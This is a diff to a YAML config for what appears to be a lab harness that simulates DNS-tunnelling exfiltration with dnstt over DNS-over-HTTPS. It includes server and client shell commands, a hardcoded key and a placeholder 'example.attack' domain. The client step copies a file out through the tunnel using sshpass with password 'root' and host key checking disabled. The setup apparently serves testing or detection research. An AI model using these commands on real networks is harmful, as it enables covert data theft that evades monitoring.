@@ -10,15 +10,11 @@ dns_attack_server:
     run:
         type: shell
         val: >-
-          nohup asciinema rec /tmp/dnstt_server.cast -c \'set -x; /root/dnstt/dnstt-server/dnstt-server -udp :53 -privkey {{ variables.privkey }} example.attack 127.0.0.1:22 & sleep 1\'
+          nohup asciinema rec /tmp/dnstt_server.cast -c \'set -x; /home/vagrant/dnstt/dnstt-server/dnstt-server -udp :53 -privkey {{ variables.privkey }} example.attack 127.0.0.1:22 & sleep 1\'
 
     artifacts_to_collect:
       - type: files
         val: ["/tmp/*.cast"]
-    
-    variables:
-        - privkey: ["d7ded13f8df25456cd365c7022c538a1341d74d918dc6f7aea64ce855e564345"]
-
 
 dns_attack_client:
     name: dnstt_client
@@ -33,7 +29,7 @@ dns_attack_client:
         type: shell
         val: >-
           set -x;
-          /root/dnstt/dnstt-client/dnstt-client -doh https://192.168.0.10/dns-query -utls {{ variables.utls }} -pubkey {{ variables.pubkey }} example.attack 127.0.0.1:7000 & sleep 1;
+          /home/vagrant/dnstt/dnstt-client/dnstt-client -doh https://192.168.0.10/dns-query -utls {{ variables.utls }} -pubkey {{ variables.pubkey }} example.attack 127.0.0.1:7000 & sleep 1;
           rsync -P --rsh="sshpass -p root ssh -l root -oStrictHostKeyChecking=no -p 7000" 127.0.0.1:/root/test-file /tmp/;
 
     artifacts_to_collect:
@@ -43,5 +39,6 @@ dns_attack_client:
         val: ["/tmp/dnstt_client_{{ variables.utls }}.cast"]
 
     variables:
-        - pubkey: ["d7ded13f8df25456cd365c7022c538a1341d74d918dc6f7aea64ce855e564345"]
+        - privkey: ["d7ded13f8df25456cd365c7022c538a1341d74d918dc6f7aea64ce855e564345"]
+        - pubkey:  ["b6fcced3162ecc334fcb49a3dc6b094c542fa071d24bf6cab890820f893a5b56"]
         - utls: ["none","Firefox", "Firefox_55", "Firefox_56", "Firefox_63", "Firefox_65", "Chrome", "Chrome_58", "Chrome_62", "Chrome_70", "Chrome_72", "Chrome_83", "iOS", "iOS_11_1", "iOS_12_1"]
